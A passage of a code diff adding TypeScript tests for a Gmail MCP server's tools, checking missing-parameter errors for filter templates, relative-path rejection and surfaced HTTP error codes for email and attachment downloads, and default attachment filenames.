+          template: "withSubject",
+          parameters: { labelIds: ["Label_x"] },
+        },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBe(true);
+      expect(result.content[0]?.text).toContain("subjectText is required");
+    });
+  });
+
+  it.each([
+    ["fromSender", { labelIds: ["L"] }, "senderEmail is required"],
+    ["largeEmails", { labelIds: ["L"] }, "sizeInBytes is required"],
+    ["containingText", { labelIds: ["L"] }, "searchText is required"],
+    ["mailingList", { labelIds: ["L"] }, "listIdentifier is required"],
+  ] as const)(
+    "create_filter_from_template (%s) surfaces a missing-parameter error",
+    async (template, params, errFragment) => {
+      // Pins the per-template parameter-missing throws in
+      // `src/tools/filters.ts:188-211`. Each template has its own
+      // throw with a template-specific message — table-driven so
+      // a regression that copies the wrong error message between
+      // templates is caught.
+      await withFix(["gmail.settings.basic"], async (fix) => {
+        const result = (await fix.client.callTool({
+          name: "create_filter_from_template",
+          arguments: { template, parameters: params },
+        })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+        expect(result.isError).toBe(true);
+        expect(result.content[0]?.text).toContain(errFragment);
+        // No filterCreate call was issued — the throw fires before
+        // the registrar reaches `createFilter`.
+        expect(fix.calls.filterCreate).toHaveLength(0);
+      });
+    },
+  );
+});
+
+describe("PR #6 registrars — download error paths", () => {
+  it("download_email rejects a relative savePath before reaching the Gmail API", async () => {
+    await withFix(["gmail.readonly"], async (fix) => {
+      // resolveDownloadSavePath enforces an absolute path; this catches
+      // the local-validation branch which fires *before* any Gmail call.
+      // Pinned separately from the HTTP-error path below — the prefix
+      // here is the generic "Failed to download email" (no HTTP code).
+      const result = (await fix.client.callTool({
+        name: "download_email",
+        arguments: { messageId: "msg_x", savePath: "relative/path", format: "json" },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBe(true);
+      expect(result.content[0]?.text).toContain("Failed to download email");
+      expect(result.content[0]?.text).not.toContain("HTTP ");
+      // No Gmail call was issued — it short-circuited on validation.
+      expect(fix.calls.messageGet).toHaveLength(0);
+    });
+  });
+
+  it("download_email surfaces the Gmail HTTP status when messages.get throws", async () => {
+    await withFix(
+      ["gmail.readonly"],
+      async (fix) => {
+        // savePath is absolute and inside the jail (downloadDir is the
+        // GMAIL_MCP_DOWNLOAD_DIR set in beforeEach), so validation
+        // passes and gmail.users.messages.get is reached. The mock then
+        // throws a {.code = 502} Error which asGmailApiError formats as
+        // "(HTTP 502)" in the catch-branch prefix.
+        const result = (await fix.client.callTool({
+          name: "download_email",
+          arguments: { messageId: "msg_502", savePath: downloadDir, format: "json" },
+        })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+        expect(result.isError).toBe(true);
+        expect(result.content[0]?.text).toContain("Failed to download email (HTTP 502)");
+        expect(result.content[0]?.text).toContain("Simulated Gmail API failure");
+        // Pin that the Gmail call was actually attempted.
+        expect(fix.calls.messageGet).toHaveLength(1);
+      },
+      { messageGetHttpError: 502 },
+    );
+  });
+
+  it("download_attachment falls back to attachment-${id} when filename is omitted", async () => {
+    await withFix(["gmail.modify"], async (fix) => {
+      const result = (await fix.client.callTool({
+        name: "download_attachment",
+        arguments: {
+          messageId: "msg_with_att",
+          attachmentId: "att_default_name",
+          savePath: downloadDir,
+        },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBeFalsy();
+      // The mock messages.get returns a payload without an
+      // `attachmentId` match in any part, so the fallback name
+      // `attachment-att_default_name` should be used.
+      expect(result.content[0]?.text).toContain("attachment-att_default_name");
+      const written = readdirSync(downloadDir);
+      expect(written).toContain("attachment-att_default_name");
+    });
+  });
+
+  it("download_attachment surfaces the Gmail HTTP status when attachments.get throws", async () => {
+    // Symmetric to the `download_email surfaces the Gmail HTTP
+    // status` test above, against `src/tools/downloads.ts:192-197`.
+    // The catch branch formats the prefix as
+    // `Failed to download attachment (HTTP <status>)` when
+    // `asGmailApiError` extracts a numeric `.code`. Without this
+    // test, a regression that drops the HTTP-code lookup and falls
+    // back to the no-code branch silently degrades the error
+    // surface.
+    await withFix(
+      ["gmail.modify"],
+      async (fix) => {
+        const result = (await fix.client.callTool({
+          name: "download_attachment",
+          arguments: {
+            messageId: "msg_x",
+            attachmentId: "att_503",
+            savePath: downloadDir,
+            filename: "x.bin",
+          },
+        })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+        expect(result.isError).toBe(true);
+        expect(result.content[0]?.text).toContain("Failed to download attachment (HTTP 503)");
+        expect(result.content[0]?.text).toContain("Simulated Gmail API failure");
+        expect(fix.calls.attachmentGet).toHaveLength(1);
+      },
+      { attachmentGetHttpError: 503 },
     );
   });
 });
